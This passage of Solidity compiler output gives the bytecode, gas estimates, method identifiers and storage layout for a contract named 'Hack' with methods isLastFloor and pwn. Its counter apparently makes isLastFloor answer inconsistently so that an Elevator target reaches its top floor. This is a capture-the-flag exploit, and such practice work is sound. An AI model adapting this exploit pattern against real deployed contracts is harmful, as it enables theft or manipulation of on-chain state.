					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH0 PUSH0 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x12 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x566 CODESIZE SUB DUP1 PUSH2 0x566 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x34 SWAP2 SWAP1 PUSH2 0xCC JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0xF7 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x9B DUP3 PUSH2 0x72 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xAB DUP2 PUSH2 0x91 JUMP JUMPDEST DUP2 EQ PUSH2 0xB5 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xC6 DUP2 PUSH2 0xA2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE1 JUMPI PUSH2 0xE0 PUSH2 0x6E JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xEE DUP5 DUP3 DUP6 ADD PUSH2 0xB8 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x451 PUSH2 0x115 PUSH0 CODECOPY PUSH0 DUP2 DUP2 PUSH1 0x97 ADD MSTORE PUSH2 0x11E ADD MSTORE PUSH2 0x451 PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xDD365B8B EQ PUSH2 0x68 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x221 JUMP JUMPDEST PUSH2 0x72 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5F SWAP2 SWAP1 PUSH2 0x266 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH2 0x95 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 PUSH0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x84 SWAP1 PUSH2 0x2AC JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 PUSH0 SLOAD GT SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xED9A7134 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xEF SWAP2 SWAP1 PUSH2 0x335 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x106 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x118 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xFE6DCDBA PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x185 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1A9 SWAP2 SWAP1 PUSH2 0x378 JUMP JUMPDEST PUSH2 0x1E8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1DF SWAP1 PUSH2 0x3FD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x200 DUP2 PUSH2 0x1EE JUMP JUMPDEST DUP2 EQ PUSH2 0x20A JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x21B DUP2 PUSH2 0x1F7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x236 JUMPI PUSH2 0x235 PUSH2 0x1EA JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x243 DUP5 DUP3 DUP6 ADD PUSH2 0x20D JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x260 DUP2 PUSH2 0x24C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x279 PUSH0 DUP4 ADD DUP5 PUSH2 0x257 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x2B6 DUP3 PUSH2 0x1EE JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x2E8 JUMPI PUSH2 0x2E7 PUSH2 0x27F JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x31F PUSH2 0x31A PUSH2 0x315 DUP5 PUSH2 0x2F3 JUMP JUMPDEST PUSH2 0x2FC JUMP JUMPDEST PUSH2 0x1EE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x32F DUP2 PUSH2 0x305 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x348 PUSH0 DUP4 ADD DUP5 PUSH2 0x326 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x357 DUP2 PUSH2 0x24C JUMP JUMPDEST DUP2 EQ PUSH2 0x361 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x372 DUP2 PUSH2 0x34E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x38D JUMPI PUSH2 0x38C PUSH2 0x1EA JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x39A DUP5 DUP3 DUP6 ADD PUSH2 0x364 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F7420746F7020666C6F6F7221000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x3E7 PUSH1 0xE DUP4 PUSH2 0x3A3 JUMP JUMPDEST SWAP2 POP PUSH2 0x3F2 DUP3 PUSH2 0x3B3 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x414 DUP2 PUSH2 0x3DB JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xDF 0xA6 0xA8 0xD7 0xC9 0x4C 0xDD ISZERO EQ 0xE5 PUSH12 0xA8449C8E12762EA6F2240D9C 0xD4 0xD9 RETURNDATASIZE 0xE5 ADD CALLER 0x21 BASEFEE SWAP13 PUSH5 0x736F6C6343 STOP ADDMOD SHR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "221000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"isLastFloor(uint256)": "infinite",
						"pwn()": "infinite"
					}
				},
				"methodIdentifiers": {
					"isLastFloor(uint256)": "5f9a4bca",
					"pwn()": "dd365b8b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 7,
						"contract": "contracts/Elevator.sol:Hack",
						"label": "count",
						"offset": 0,
						"slot": "0",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}